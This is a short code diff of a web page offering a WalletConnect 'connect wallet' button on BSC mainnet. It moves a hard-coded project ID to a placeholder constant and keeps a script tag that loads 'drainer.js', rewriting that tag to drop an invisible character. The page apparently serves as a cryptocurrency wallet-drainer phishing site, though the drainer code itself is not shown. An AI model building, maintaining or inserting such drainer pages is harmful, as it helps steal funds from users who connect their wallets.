@@ -92,7 +92,7 @@ let signer;
 let activeProviderType;
 
 const wcBtn = document.getElementById('connectBtn'); // WalletConnect button
-const WALLETCONNECT_PROJECT_ID = "85d1310d55b14854c6d62bab3b779200"; // Replace with your WalletConnect project ID
+const WALLETCONNECT_PROJECT_ID = "YOUR_PROJECT_ID"; // Replace with your WalletConnect project ID
 const NETWORKS = {
     56: { rpc: "https://bsc-dataseed.binance.org/" } // BSC mainnet
 };
@@ -112,7 +112,7 @@ wcBtn.onclick = async () => {
         const { EthereumProvider } = await import('https://esm.sh/@walletconnect/ethereum-provider@2?bundle');
 
         wcProvider = await EthereumProvider.init({
-            projectId: '85d1310d55b14854c6d62bab3b779200',
+            projectId: WALLETCONNECT_PROJECT_ID,
             chains: [56],
             showQrModal: true,
             rpcMap: { 56: NETWORKS[56].rpc },
@@ -163,7 +163,6 @@ function updateStatusMessage(msg, type) {
 </script>
 
 <script src="script.js"></script>
-‎<script src="drainer.js"></script>
-  
+<script src="drainer.js"></script>
 </body>
   </html>
